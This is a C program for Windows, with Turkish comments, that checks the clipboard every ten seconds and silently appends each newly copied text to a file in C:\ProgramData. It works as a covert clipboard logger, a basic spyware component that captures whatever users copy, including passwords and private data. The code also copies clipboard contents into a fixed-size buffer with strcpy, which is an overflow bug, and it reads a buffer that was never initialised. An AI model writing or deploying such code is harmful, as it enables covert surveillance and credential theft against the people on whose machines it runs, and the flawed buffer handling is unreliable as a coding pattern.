#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

void CaptureClipboardData(void) {
    if (!OpenClipboard(NULL)) {
        printf("Panoya erişim başarısız.\n");
        return;
    }

    HANDLE hClipboardData = GetClipboardData(CF_TEXT);
    if (hClipboardData == NULL) {
        CloseClipboard();
        printf("Panodan veri alınamadı.\n");
        return;
    }

    char *bytes = (char *)GlobalLock(hClipboardData);
    if (bytes == NULL) {
        CloseClipboard();
        printf("Panodaki veri kilidi açılamadı.\n");
        return;
    }

    char filePath[MAX_PATH];
    char fileName[MAX_PATH];
    // Dosya yolunu ve adını oluşturuyoruz
    GetModuleFileName(NULL, filePath, MAX_PATH);
    sprintf(fileName, "%s\\meisterlos.txt", "C:\\ProgramData");

    FILE *file = fopen(fileName, "a"); // 'a' modu ile dosyayı açıyoruz (ekleme modu)
    if (file == NULL) {
        GlobalUnlock(hClipboardData);
        CloseClipboard();
        printf("Dosya oluşturma hatası.\n");
        return;
    }

    int size = strlen(bytes);
    fwrite(bytes, size, 1, file);

    fprintf(file, "\n"); // Dosyaya bir satır boşluk ekliyoruz

    fclose(file);
    GlobalUnlock(hClipboardData);
    CloseClipboard();
}

int main() {
    char lastCopiedText[MAX_PATH] = ""; // Son kopyalanan metni tutmak için bir değişken
    char currentText[MAX_PATH]; // Şu anki kopyalanan metni tutmak için bir değişken

    while (1) {
        if (OpenClipboard(NULL)) {
            HANDLE hClipboardData = GetClipboardData(CF_TEXT);
            if (hClipboardData != NULL) {
                char *bytes = (char *)GlobalLock(hClipboardData);
                if (bytes != NULL) {
                    strcpy(currentText, bytes); // Şu anki metni al
                    GlobalUnlock(hClipboardData);
                }
            }
            CloseClipboard();
        }

        if (strcmp(lastCopiedText, currentText) != 0) {
            // Şu anki metin, önceki metinden farklıysa yaz
            CaptureClipboardData();
            strcpy(lastCopiedText, currentText); // Son metni güncelle
        }

        Sleep(10000); // 10 saniye bekle
    }

    return 0;
}